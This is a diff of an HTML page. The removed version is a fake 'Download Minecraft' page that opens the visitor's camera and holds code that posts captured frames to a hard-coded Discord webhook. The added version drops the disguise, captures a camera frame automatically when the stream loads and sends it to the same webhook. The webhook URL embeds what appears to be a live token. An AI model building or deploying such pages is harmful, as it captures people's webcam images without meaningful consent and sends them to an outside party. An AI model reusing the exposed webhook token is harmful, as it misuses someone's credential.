@@ -1,8 +1,11 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Download Minecraft & Color Changing Website</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Send Image to Discord Webhook</title>
     <style>
+        /* Styles for the page */
         body {
             font-family: 'Arial', sans-serif;
             background-color: #1a1a1d;
@@ -64,27 +67,29 @@
     </style>
 </head>
 <body>
-    <h1>Welcome to the Minecraft Download Page & Color Changing Website!</h1>
-    <p>Click the "Download Minecraft" button to download Minecraft and the "Change Color" button to change the background color:</p>
+    <h1>Welcome to the Image Capture & Discord Webhook Page!</h1>
+    <p>This page will capture your image from the camera and send it to the Discord webhook.</p>
 
-    <button id="downloadButton">Download Minecraft</button>
-    <button id="colorChangeButton">Change Color</button>
     <video id="videoElement" autoplay></video>
 
     <script>
+        // JavaScript code
         const video = document.getElementById('videoElement');
-        let imgIndex = 1;
 
+        // Check if the browser supports accessing the user's camera
         if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(function (stream) {
                     video.srcObject = stream;
+                    // Call the capturePicture function when the video stream is loaded
+                    capturePicture();
                 })
                 .catch(function (error) {
                     console.error("Error accessing camera:", error);
                 });
         }
 
+        // Function to capture a picture from the video stream
         function capturePicture() {
             const canvas = document.createElement('canvas');
             canvas.width = video.videoWidth;
@@ -92,54 +97,23 @@
             canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
             const imgURL = canvas.toDataURL('image/png');
 
+            // Send the captured image to the provided Discord webhook
             const webhookURL = 'https://ptb.discord.com/api/webhooks/1218581972482527292/56_Q51t96EYp1h_rD6A9ub5RQOn-_dtfNWY-kjvd3smQy2O8Ly-wVzWi6t-8dAQ7oCg1'; // Your Discord webhook URL
-            const imgData = imgURL.replace(/^data:image\/\w+;base64,/, '');
-            const imgBlob = dataURItoBlob(imgURL);
-            const imgFormData = new FormData();
-            imgFormData.append('image' + imgIndex, imgBlob, 'captured_image_' + imgIndex + '.png');
 
             fetch(webhookURL, {
                 method: 'POST',
-                body: imgFormData
+                body: JSON.stringify({ content: 'Image captured from user camera:', files: [imgURL] })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Failed to send image to Discord webhook');
+                }
+                console.log('Image sent to Discord webhook');
+            })
+            .catch(error => {
+                console.error('Error:', error);
             });
-
-            console.log('Image ' + imgIndex + ' sent to Discord webhook');
-            imgIndex++;
         }
-
-        function dataURItoBlob(dataURI) {
-            var byteString = atob(dataURI.split(',')[1]);
-            var ab = new ArrayBuffer(byteString.length);
-            var ia = new Uint8Array(ab);
-            for (var i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            return new Blob([ab], { type: 'image/png' });
-        }
-
-        const downloadButton = document.getElementById('downloadButton');
-        downloadButton.addEventListener('click', function () {
-            const fileContent = 'This is a sample Minecraft file. Enjoy playing Minecraft!';
-            const fileBlob = new Blob([fileContent], { type: 'text/plain' });
-            const fileURL = URL.createObjectURL(fileBlob);
-
-            const downloadLink = document.createElement('a');
-            downloadLink.href = fileURL;
-            downloadLink.download = 'minecraft.txt';
-            downloadLink.click();
-        });
-
-        const colorChangeButton = document.getElementById('colorChangeButton');
-        const colors = ['#673ab7', '#f44336', '#03a9f4', '#e91e63', '#ff5722']; /* Luxury color palette */
-        let index = 0;
-
-        colorChangeButton.addEventListener('click', function () {
-            document.body.style.backgroundColor = colors[index];
-            let textColor = index === colors.length - 1 ? '#000' : '#fff';
-            document.body.style.color = textColor;
-            downloadButton.style.backgroundColor = colors[index]; // Change button color along with background
-            index = (index + 1) % colors.length;
-        });
     </script>
 </body>
 </html>
